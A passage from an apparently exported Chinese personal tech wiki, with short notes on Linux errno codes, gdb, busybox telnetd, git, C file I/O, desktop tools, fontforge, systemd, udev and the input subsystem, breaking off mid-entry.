重置时断开网络连接ECONNABORTED 103 由软件导致的连接断开ECONNRESET 104 连接被对方重设ENOBUFS 105 没有可用的缓冲区空间EISCONN 106 传输端点已连接ENOTCONN 107 传输端点尚未连接ESHUTDOWN 108 无法在传输端点关闭以后发送ETOOMANYREFS 109 过多的引用：无法接合ETIMEDOUT 110 连接超时ECONNREFUSED 111 拒绝连接EHOSTDOWN 112 主机关闭EHOSTUNREACH 113 没有到主机的路由EALREADY 114 操作已经在进行EINPROGRESS 115 操作现在正在进行ESTALE 116 过旧的文件控柄EUCLEAN 117 结构需要清理ENOTNAM 118 不是 XENIX 命名的类型文件ENAVAIL 119 没有可用的 XENIX 信号量EISNAM 120 是一个有名类型文件EREMOTEIO 121 远程 I/O 错误EDQUOT 122 超出磁盘限额ENOMEDIUM 123 找不到介质EMEDIUMTYPE 124 错误的介质类型ECANCELED 125 操作已取消ENOKEY 126 需要的关键字不存在EKEYEXPIRED 127 关键字已过期EKEYREVOKED 128 键值已取消EKEYREJECTED 129 键值被服务所拒绝EOWNERDEAD 130 拥有者已消逝ENOTRECOVERABLE 131 状态无法回复ERFKILL 132 由于 RF-kill 而无法操作EHWPOISON 133 内存分页有硬件错误ENOTSUP 95 不支持的操作","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"gdb","date":"2019-10-28T00:00:00.000Z","path":"wiki/计算机/linux/devtools/gdb/","text":"参考： 一个15分钟演讲，让你改变对gdb的看法： https://undo.io/resources/cppcon-2015-greg-law-give-me-15-minutes-ill-change/ GDB 自动化操作的技术 https://segmentfault.com/a/1190000005367875 gdb基本使用 作者：大CC 博客：http://blog.me115.com Github地址：https://github.com/me115/linuxtools_rst GDB是一个由GNU开源组织发布的、UNIX/LINUX操作系统下的、基于命令行的、功能强大的程序调试工具。 对于一名Linux下工作的c++程序员，gdb是必不可少的工具； 启动gdb对C/C++程序的调试，需要在编译前就加上-g选项: 1$g++ -g hello.cpp -o hello 调试可执行文件: 1$gdb program也就是你的执行文件，一般在当前目录下。 调试core文件(core是程序非法执行后core dump后产生的文件): 12$gdb $gdb program core.11127 调试服务程序: 12$gdb $gdb hello 11127 如果你的程序是一个服务程序，那么你可以指定这个服务程序运行时的进程ID。gdb会自动attach上去，并调试他。program应该在PATH环境变量中搜索得到。 gdbserver远程调试gdbServer + gdb 调试https://www.cnblogs.com/Dennis-mi/articles/5018745.html 1target$ gdbserver --multi :5678 1234567891011# 连接到目标机gdb> target extended-remote 目标机器IP:5678# 指定目标程序路径gdb> set remote exec-file 目标机器运行程序路径# 指定本地程序，载入符号表gdb> file 本地程序路径# 退出gdbservergdb> monitor exit gdb交互命令启动gdb后，进入到交互模式，通过以下命令完成对程序的调试；注意高频使用的命令一般都会有缩写，熟练使用这些缩写命令能提高调试的效率； 运行 run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。 continue （简写c ）：继续执行，到下一个断点处（或运行结束） next：（简写 n），单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。 step （简写s）：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的 until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。 until+行号： 运行至某行，不仅仅用来跳出循环 finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。 call 函数(参数)：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55) quit：简记为 q ，退出gdb 设置断点 break n （简写b n）:在第n行处设置断点 （可以带上代码路径和代码名称： b OAGUPDATE.cpp:578） b fn1 if a＞b：条件断点设置 break func（break缩写为b）：在函数func()的入口处设置断点，如：break cb_button delete 断点号n：删除第n个断点 disable 断点号n：暂停第n个断点 enable 断点号n：开启第n个断点 clear 行号n：清除第n行的断点 info b （info breakpoints） ：显示当前程序的断点设置情况 delete breakpoints：清除所有断点： 查看源代码 list ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。 list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12 list 函数名：将显示“函数名”所在函数的源代码，如：list main list ：不带参数，将接着上一次 list 命令的，输出下边的内容。 打印表达式 print 表达式：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。 print a：将显示整数 a 的值 print ++a：将把 a 中的值加1,并显示出来 print name：将显示字符串 name 的值 print gdb_test(22)：将以整数22作为参数调用 gdb_test() 函数 print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数 display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display a watch 表达式：设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch a whatis ：查询变量或函数 info function： 查询函数 扩展info locals： 显示当前堆栈页的所有变量 查询运行信息 where/bt ：当前运行的堆栈列表； bt backtrace 显示当前调用堆栈 up/down 改变堆栈显示的深度 set args 参数:指定运行时的参数 show args：查看设置好的参数 info program： 来查看程序的是否在运行，进程号，被暂停的原因。 分割窗口 layout：用于分割窗口，可以一边查看代码，一边测试： layout src：显示源代码窗口 layout asm：显示反汇编窗口 layout regs：显示源代码/反汇编和CPU寄存器窗口 layout split：显示源代码和反汇编窗口 Ctrl + L：刷新窗口 交互模式下直接回车的作用是重复上一指令，对于单步调试非常方便； 忽略SIG例如： 1gdb) handle SIGPIPE nostop TUI文本模式UICtrl+X,A开启TUI，Ctrl+X,2开启汇编代码 查看浮点寄存器tui reg float Up、Down键被TUI用了，而CLI的上翻、下翻变成了Ctrl+P和Ctrl+N GDB 反向调试（Reverse Debugging）比如在一个循环中某些情况下才触发的错误，得等到触发了程序才停下来。 12watch reverse-continue GDB中使用pythonOr you can even set breakpoints in python: 1python gdb.Breakpoint(‘7’) GDB脚本 GDB启动时，会在当前目录下查找.gdbinit，存在则会自动执行脚本 GDB运行期间可以使用 source 来执行GDB脚本","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"telnet","date":"2019-10-28T00:00:00.000Z","path":"wiki/计算机/linux/devtools/telnet/","text":"busybox下开启telnet的方法在busybox下尝试编译telnetd，无法连接，telnetd -F把服务放前台运行，得到错误日志： 1telnetd: can't find free pty 解决方法： Linux Kernel Config: 1CONFIG_UNIX98_PTYS=y Busybox Config: 1CONFIG_FEATURE_DEVPTS=y Rootfs: 123mkdir /dev/ptsmount -t devpts devpts /dev/ptsmknod -m 666 /dev/ptmx c 5 2","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"git","date":"2019-10-28T00:00:00.000Z","path":"wiki/计算机/linux/devtools/git/","text":"图形界面:gitkraken 据说好用的git图形界面 12345# 检出分支到本地新分支、覆盖工作区git checkout -f -B branchabc remotes/origin/branchabc --# 添加gpg签名密钥git config --global user.signingkey 0A46826A 基本操作1234567891011121314151617181920212223# 检出dev分支git checkout dev# 创建分支并切换到该分支git checkout -b xxx# 检出某个文件, 还原工作区git checkout xxx.c# 把dev合并到当前分支git merge dev# 变基到dev分支git rebase dev# 查看某文件历史git log --pretty=oneline xxx.c# 查看某commit中的变更git show 7cb554fc6663ea62bae727f1489859947e87c5de# 删除未跟踪文件 -x连ignore的文件也一起 -d目录git clean -xfd 分支操作1234# 删除分支git branch -D xxx# 删除远程分支git push origin --delete feature/main-functions 恢复reset使分支指针定向到指定commit记录上, 那之后的提交会丢失. 1git reset bf7e5b --hard –soft 仅重置指针 –mix, 重置指针和index –hard, 重置指针/index/工作区 revert回滚, 用新提交覆盖. 场景1：release分支中有一份导致bug的feature提交，需要在hotfix分支中回滚 场景2：开发时，本地缺少部分很难处理的依赖，但开发的功能用不到这部分依赖，可以做一个解除依赖的commit（删删删），待开发完功能，再回滚，把特性分支rebase合并提交。 ff合并和合并细节注意到有时执行git merge不会产生合并记录, 这是触发了git的fast-forward功能. 另外, 合并到master似乎默认使用--no-ff方式, 必然产生合并记录. 作者：Chuckiefan 链接：https://www.jianshu.com/p/58a166f24c81 fast-forward合并通常情况下分支合并都会产生一个合并节点，但是在某些特殊情况下例外。例如调用git pull命令更新远端代码时，如果本地的分支没有任何的提交，那么没有必要产生一个合并节点。这种情况下将不会产生一个合并节点，HEAD直接指向更新后的顶端代码，这种合并的策略就是fast-forward合并。 合并细节除了上文所提到的fast-forward合并模式以外，被合并的分支将会通过一个合并节点和当前分支绑在一起，该合并节点同时拥有合并前的当前分支顶部节点和对方分支顶部节点，共同作为父节点。 一个合并了的版本将会使所有相关分支的变化一致，包括提交节点，HEAD节点和index指针以及节点树都会被更新。只要这些节点中的文件没有重叠的地方，那么这些文件的变化都会在节点树中改动并更新保存。 如果无法明显地合并这些变化，将会发生以下的情况： HEAD指针所指向的节点保持不变 MERGE_HEAD指针被置于其他分支的顶部 已经合并干净的路径在index文件和节点树中同时更新 对于冲突路径，index文件记录了三个版本：版本1记录了二者共同的祖先节点，版本2记录了当前分支的顶部，即HEAD，版本3记录了MERGE_HEAD。节点树中的文件包含了合并程序运行后的结果。例如三路合并算法会产生冲突。 其他方面没有任何变化。特别地，你之前进行的本地修改将继续保持原样。 如果你尝试了一个导致非常复杂冲突的合并，并想重新开始，那么可以使用git merge --abort 关于三路合并算法： 三路合并算法是用于解决冲突的一种方式，当产生冲突时，三路合并算法会获取三个节点：本地冲突的B节点，对方分支的C节点，B，C节点的共同最近祖先节点A。三路合并算法会根据这三个节点进行合并。具体过程是，B，C节点和A节点进行比较，如果B，C节点的某个文件和A节点中的相同，那么不产生冲突；如果B或C只有一个和A节点相比发生变化，那么该文件将会采用该变化了的版本；如果B和C和A相比都发生了变化，且变化不相同，那么则需要手动去合并;如果B，C都发生了变化，且变化相同，那么并不产生冲突，会自动采用该变化的版本。最终合并后会产生D节点，D节点有两个父节点，分别为B和C。 无法显示中文问题1git config --global core.quotepath false 忽略权限1git config core.filemode false tigtig是git的文字GUI，中文需要安装依赖。 12345678sudo apt install libncursesw5 libncursesw5-devgit clone https://github.com/jonas/tig.gitcd tiggit checkout -t origin/releasemake configure./configure --prefix=/usrmakesudo make install install-release-doc 嗯arch下直接yay -S tig就能装好了。 配置在~/.tigrc，man tigrc能看到编写帮助，可以在tig中增加一些自定义操作。 12# 查看某文件相关的log(文件夹也一样)tig xxx.c 使用git diff对比任意文件夹1diff","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"linux文件操作","date":"2019-10-28T00:00:00.000Z","path":"wiki/计算机/linux/linux文件操作/","text":"打开文件fopen12#include FILE *fopen(char *filename,char *type); type为[B][C]组合字符串. A: 123* r: 读, 指针设0, 不改变文件长度;* w: 写, 文件不存在时文件被创建, 文件存在时文件长度设为0, 指针设为0;* a: 追加写, 指针设为文件尾 B:12* b: 二进制方式打开 * t: 文本方式打开 C:1* +: 可以同时input/output, 使用时必须注意用fflush或者fseek来防止内置buffer没消耗干净 读文件fread/写文件fwrite1234#include size_t fread(void *ptr, size_t size, size_t nmembFILE *stream );size_t fwrite(const void *ptr, size_t size, size_t nmemb,FILE *stream); fwrite()的语义是写入nmemb个size大小的对象, 返回值为写入对象的数量(而不是总共的字节数). 空间预分配posix_fallocate12#include int posix_fallocate(int __fd, off_t __offset, off_t __len); 据说还有个linux版本的 http://man7.org/linux/man-pages/man2/fallocate.2.html:123#define _GNU_SOURCE /* See feature_test_macros(7) */#include int fallocate(int fd, int mode, off_t offset, off_t len); 改变文件大小ftruncate将文件大小改变为参数length指定的大小，如果原来的文件大小比参数length大，则超过的部分会被删除，如果原来的文件大小比参数length小，则文件将被扩展. 12#include int ftruncate (int __fd, __off_t __length); 注意这个操作不会改变当前指针, 比如缩小文件为0时, 并不会将指针置0. 将通过posix接口打开的文件改为非阻塞方式读fopen和popen打开的文件，直接操作会是阻塞方式读，这里有个技巧： 123456789101112131415161718fp = popen(path, \"r\");if (NULL == fp) { LOG_ERR(\"%s:fail to open %s\\n\", __func__, path); return -1;}fcntl(fileno(fp), F_SETFL, O_NONBLOCK);n = read(fileno(fp), buff, sizeof(buff));if (n == -1 && errno == EAGAIN) { // no data yet, do nothing}else if (n > 0) { print_hex(buff, n);}else { // pipe closed LOG(\"n=%d, err=%d\\n\", n, errno);}","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"图形桌面相关工具","date":"2019-10-28T00:00:00.000Z","path":"wiki/计算机/linux/tools/图形桌面相关工具/","text":"深度截图https://www.deepin.org/en/original/deepin-screenshot/ https://www.freedesktop.org/wiki/Software/ terminator终端图形化分栏https://gnometerminator.blogspot.com/ 图形化文件管理器（可sftp）https://krusader.org/ 对比工具kdiff3 视力保护redshift 番茄钟gnome-shell-pomodoro https://gnomepomodoro.org/ gparted 图形化的分区管理工具，易用。 barrier 一个从“Synergy” fork出来的通过网络连接共享鼠标键盘的工具，客户端可以用服务器的鼠标、键盘资源，分享剪切板 nemocinnamon默认的文件管理器，简单好用。 连接网络目标、外部设备很方便。 “空格键”可以预览文件内容，难得的是还带高亮。 P.S 然而挂掉的几率似乎有点高 linux下用罗技m570轨迹球鼠标上的的按钮https://lovingboth.com/logitech-m570-trackball-buttons-in-linux/ 1234567891011121314cd ~sudo apt-get install xbindkeys xautomationCreate a file ~/.xbindkeysrc and put\"xte 'key Page_Up'\"b:9\"xte 'key Page_Down'\"b:8(when 'button 9' is pressed, run the xte program to emulate a 'PgUp' keystroke, and similarly when 'button 8' is pressed, emulate a 'PgDn' keystroke) in it with your favourite text editor. Runxbindkeys GoldenDict 词典windows build: https://github.com/goldendict/goldendict/wiki/Early-Access-Builds-for-Windows 兼容EPWING字典格式, 还可以很方便的查wiki. Babylon dictionaries (.BGL), complete with images and resourcesStarDict dictionaries (.ifo/.dict./.idx/.syn)DictD dictionaries (.index/.dict(.dz))ABBYY Lingvo source files (.dsl(.dz)), together with abbreviations.Xdxf dictionaries (.xdxf(.dz))AardDictionary dictionaries (.aar)SDictionary dictionaries (.dct)Zim dictionaries (.zim)MDict dictionaries (.mdx/.mdd)Epwing dictionariesSlob dictionaries (.slob)ABBYY Lingvo sound archives (.lsa/.dat)Sound files in separate foldersZips sound packs (.zips) FreeRDP远程桌面windows的3389远程桌面使用的是RDP协议 linux下实现的服务端和客户端, 是FreeRDP: https://github.com/FreeRDP/FreeRDP yakuake下拉式的终端界面，配合着固定式的使用很方便。 geditgnome的默认编辑器，界面美观操作友好。 在i3wm下工作良好，同一工作区打开的文件会合并到同一窗口. Notepadpp，i3wm下对工作区支持不好，无法在不同工作区打开不同实例；有换行bug，有些时候按下箭头按键无法下翻 xed太过简单 功能得靠插件： 列编辑(中文支持不好。。) https://github.com/code-tree/imitation/ 插件集1: gedit-plugins 插件集2: https://github.com/gmate/gmate feh一个命令行图像查看器，可以用来设置桌面背景，例如定期随机设置背景，random-bg-picture.sh： 1234567#!/bin/bashwhile :do feh --randomize --bg-fill ~/Pictures/BG sleep 900done 不清楚为什么watch命令置后台后后不起作用，用这个脚本里跑sleep就正常。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"c语言实现读文件超时","date":"2019-10-28T00:00:00.000Z","path":"wiki/计算机/编程/C/c语言实现读文件超时/","text":"via: https://stackoverflow.com/questions/2917881/how-to-implement-a-timeout-in-read-function-call 1234567891011121314151617181920212223242526272829#include #include #include #include #include int main(void){ fd_set set; struct timeval timeout; int rv; char buff[100]; int len = 100; int filedesc = open( \"dev/ttyS0\", O_RDWR ); FD_ZERO(&set); /* clear the set */ FD_SET(filedesc, &set); /* add our file descriptor to the set */ timeout.tv_sec = 0; timeout.tv_usec = 10000; rv = select(filedesc + 1, &set, NULL, NULL, &timeout); if(rv == -1) perror(\"select\"); /* an error accured */ else if(rv == 0) printf(\"timeout\"); /* a timeout occured */ else read( filedesc, buff, len ); /* there was data to read */}","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"C","slug":"计算机/编程/C","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/C/"}]},{"title":"硬盘选购","date":"2019-10-03T00:00:00.000Z","path":"wiki/计算机/攒机相关/硬盘选购/","text":"零售硬盘的信息数据库https://www.chiphell.com/forum.php?mod=viewthread&tid=1676546&extra=page%3D1%26filter%3Dlastpost%26orderby%3Dlastpost%26typeid%3D667","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"攒机相关","slug":"计算机/攒机相关","permalink":"http://wiki.noodlefighter.com/categories/计算机/攒机相关/"}]},{"title":"fontforge","date":"2019-09-30T00:00:00.000Z","path":"wiki/计算机/linux/tools/fontforge/","text":"使用fontforge解压ttc字体到ttf/otf字体ttc是被推荐使用的新格式，其中可以包含多个ttf/otf字体，他们可以有一些公用部分，所以整体大小比分开的几个字体文件更小。 via: https://gist.github.com/fatum12/941a10f31ac1ad48ccbc 1234567891011121314151617181920#!/usr/local/bin/fontforge# Usage: fontforge -script ttc2ttf.pe /path/to/font.ttcfonts = FontsInFile($1)n = SizeOf(fonts)i = 0while (i < n) Open($1 + \"(\" + fonts[i] + \")\", 1) ext = \".ttf\" if ($order == 3) ext = \".otf\" endif filename = $fontname + ext Generate(filename) Print(filename) Close() ++iendloop TODO: 试了一下好像不顶用啊。。有空再试试","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"opengl","date":"2019-09-30T00:00:00.000Z","path":"wiki/计算机/编程/中间件/opengl/","text":"OPENGL相关库gl3whttps://github.com/skaslev/gl3w glewhttps://github.com/nigels-com/glew glfwgaldMesa 3Dhttps://mesamatrix.net/ 如何使用不依赖窗口（windows form、X.org）的opengl参考： 问答opengl-without-x-org-in-linux： https://stackoverflow.com/questions/3326641/opengl-without-x-org-in-linux nvidia对headless程序使用opengl的提示： https://devblogs.nvidia.com/linking-opengl-server-side-rendering/","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"中间件","slug":"计算机/编程/中间件","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/中间件/"}]},{"title":"rtsp","date":"2019-09-30T00:00:00.000Z","path":"wiki/计算机/计算机网络/rtsp/","text":"参考： 从零开始写一个发送h264的rtsp服务器 RTSP协议文档RFC2326：https://www.ietf.org/rfc/rfc2326.txt h264paser分析器：https://sourceforge.net/projects/h264streamanalysis/ 规范文档： Information technology – Coding of audio-visual objects – Part 10: Advanced Video Coding ISO/IEC 14496-10:2014","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"计算机网络","slug":"计算机/计算机网络","permalink":"http://wiki.noodlefighter.com/categories/计算机/计算机网络/"}]},{"title":"树莓派基本使用","date":"2019-09-28T00:00:00.000Z","path":"wiki/电子工程/嵌入式软件/树莓派基本使用/","text":"1raspi-config 便捷配置选单 Raspberry Pi Zero OTG Modehttps://gist.github.com/gbaman/50b6cca61dd1c3f88f41","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式软件","slug":"电子工程/嵌入式软件","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式软件/"}]},{"title":"android_source_code","date":"2019-09-28T00:00:00.000Z","path":"wiki/计算机/android/android-source-code/","text":"仓库： https://android.googlesource.com/ 安卓linux内核： https://android.googlesource.com/kernel/build/","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"android","slug":"计算机/android","permalink":"http://wiki.noodlefighter.com/categories/计算机/android/"}]},{"title":"strace和ltrace","date":"2019-09-28T00:00:00.000Z","path":"wiki/计算机/linux/devtools/strace和ltrace/","text":"stracestrace可以跟踪系统调用 ltraceltrace可以跟踪动态库调用","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"framebuffer驱动","date":"2019-09-28T00:00:00.000Z","path":"wiki/计算机/linux/framebuffer驱动/","text":"介绍： https://www.cnblogs.com/shenhaocn/archive/2011/04/11/2013112.html https://www.embeddedlinux.org.cn/emb-linux/kernel-driver/201710/25-7674.html 官方： http://www.linux-fbdev.org/HOWTO/index.html 12345678910inf fdScreen = open( \"devicename\", O_RDWR );fb_var_screeninfo varInfo;ioctl( fdScreen, FBIOGET_VSCREENINFO, &varInfo );//set resolution/dpi/color depth/.. in varInfo, then write it backioctl( fdScreen, FBIOPUT_VSCREENINFO, &varInfo );//get writable screen memory; unsigned short here for 16bit colorunsigned short* display = mmap( 0, nScreenSize, PROT_READ | PROT_WRITE, MAP_SHARED, fdScreen, 0 );","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"linux的input子系统","date":"2019-09-28T00:00:00.000Z","path":"wiki/计算机/linux/linux的input子系统/","text":"linux的输入子系统，/dev/input/*，查看设备列表： 1￥ cat /proc/bus/input/devices 通过设备文件读input event/dev/input/evnet*，可以读、阻塞读、select。 #include ： 123456struct input_event { struct timeval time; unsigned short type; unsigned short code; unsigned int value; }; 触摸屏库tslibhttps://github.com/libts/tslib 电阻式触摸屏的输入需要校准、与显示屏尺寸对应，tslib就能实现这些需求。 Debian的源里叫libts，README.md，参考man ts.conf。 触摸屏校准（校准信息被存放在/etc/pointercal里）： 1$ sudo TSLIB_TSDEVICE=/dev/input/event0 TSLIB_FBDEVICE=/dev/fb1 ts_calibrate 校准后测试： 1$ sudo TSLIB_TSDEVICE=/dev/input/event0 TSLIB_FBDEVICE=/dev/fb1 ts_test 开启input event服务： 1$ sudo TSLIB_TSDEVICE=/dev/input/event0 ts_uinput -d 服务开启后，查看设备： 1234567891011121314$ cat /proc/bus/input/devices...(略)I: Bus=0006 Vendor=0000 Product=0000 Version=0000N: Name=\"ts_uinput\"P: Phys=S: Sysfs=/devices/virtual/input/input2U: Uniq=H: Handlers=mouse1 event1B: PROP=0B: EV=bB: KEY=400 0 0 0 0 0 0 0 0 0 0B: ABS=1000003 库的README.md中提到“symlink /dev/input/ts_uinput to to the new event file”的两种方式：用脚本链接（传统方式）、写udev的rules。 写udev的rules的方式比较优秀，还能顺便把tslib要用的event设备映射成/dev/input/ts，/etc/udev/rules.d/98-touchscreen.rules： 12SUBSYSTEM==\"input\", KERNEL==\"event[0-9]*\", ATTRS{name}==\"NAME_OF_THE_TOUCH_CONTROLLER\", SYMLINK+=\"input/ts\", TAG+=\"systemd\" ENV{SYSTEMD_WANTS}=\"ts_uinput.service\"SUBSYSTEM==\"input\", KERNEL==\"event[0-9]*\", ATTRS{name}==\"ts_uinput\", SYMLINK+=\"input/ts_uinput\" 测试工具evtest截图是测试一个触摸屏/dev/input/event0","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"linux键盘布局相关","date":"2019-09-28T00:00:00.000Z","path":"wiki/计算机/linux/linux键盘布局相关/","text":"archlinuxu的wiki上的说明： https://wiki.archlinux.org/index.php/Linux_console/Keyboard_configuration loadkeys: https://jlk.fjfi.cvut.cz/arch/manpages/man/loadkeys.1 问答： https://superuser.com/questions/729585/remap-keys-without-xmodmap-or-any-x-tools#comment1565295_729585 https://stackoverflow.com/questions/34582279/linux-c-keymapping-keycodes 总结在linux中，输入设备在input子系统中被抽象，如/dev/input/event*，我们能拿到的keycode在这里被归一。测试按键，获得keycode： 1# showkeys 只有keycode是不足以在console上输入字符的，因为不同的键盘布局上的同一个键打出来的字符是不一样的，比如Shift+2在US布局里是“@”而欧洲布局里是欧元符号，所以linux还有一套从keycode转换到字符的机制。 从linux的map文件生成c语言数组的map表： 1# loadkeys --mktable defkeymap.map 查看当前映射表： 1# dumpkeys","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"systemd","date":"2019-09-28T00:00:00.000Z","path":"wiki/计算机/linux/tools/systemd/","text":"systemctl systemd 是 Linux 下的一款系统和服务管理器，兼容 SysV 和 LSB 的启动脚本。systemd 的特性有：支持并行化任务；同一时候採用 socket 式与 D-Bus 总线式激活服务；按需启动守护进程（daemon）。利用 Linux 的 cgroups 监视进程；支持快照和系统恢复。维护挂载点和自己主动挂载点。各服务间基于依赖关系进行精密控制 systemd的人机交互接口就是systemctl，比如看nfs服务的日志： 1$ systemctl status nfs-server.service 查找自启服务 1$ sudo systemctl list-unit-files | grep enabled 开机自启 1$ sudo systemctl enable sshd 禁止开机自启 1$ sudo systemctl disable sshd 停止服务 1$ systemctl stop sshd 启动服务 1$ systemctl start sshd 检查某个服务的状态 1$ systemctl status sshd 添加一个服务 https://www.freedesktop.org/software/systemd/man/systemd.service.html#Examples /etc/systemd/system/foo.service，权限644. 12345678[Unit]Description=Foo[Service]ExecStart=/usr/sbin/foo-daemon[Install]WantedBy=multi-user.target 完成后重新载入： 1$ systemctl daemon-reload","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"udev","date":"2019-09-28T00:00:00.000Z","path":"wiki/计算机/linux/tools/udev/","text":"TODO https://wiki.archlinux.org/index.php/Udev_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87) http://webpages.charter.net/decibelshelp/LinuxHelp_UDEVPrimer.html https://blog.csdn.net/chituhuan/article/details/52383610 在用户态管理设备接入、移除的程序 udev规则编写(udev rule)参考：使用 udev 高效、动态地管理 Linux 设备文件 / 规则文件编写可参考man udev 配置文件位置：/usr/lib/udev/rules.d系统自带的规则，会随系统更新而更新；/etc/udev/rules.d用户自定义规则。规则文件命名如50-udev-default.rules，自定义中如果有同名文件，会覆盖自带的规则。 大概的逻辑就是：匹配–>执行操作，比如： 为指定大小的磁盘产生符号链接的规则 1SUBSYSTEM==\"block\", SYSFS{size}==\"71096640\", SYMLINK =\"my_disk\" 通过外部命令为指定序列号的磁盘产生设备文件的规则 12KERNEL==\"sd*[0-9]\", PROGRAM==\"/lib/udev/scsi_id -g -s %p\", \\RESULT==\"35000c50000a7ef67\", NAME +=\"root_disk%n\" 相关命令： 123456# 查看某设备文件的信息（可以用来获取sysfs路径） ，以便编写规则udevadm info --attribute-walk /dev/ttyUSB0# 测试规则udevadm test --action=\"add\" /devices/pci0000:00/0000:00:1a.0/usb1/1-1/1-1.3/1-1.3.1/1-1.3.1:1.0/ttyUSB0/tty/ttyUSB0# 重新载入规则udevadm control --reload 例子，99-tty-permission.rules，设置所有ttyUSB设备权限为0777： 1KERNEL==\"ttyUSB*[0-9]\", 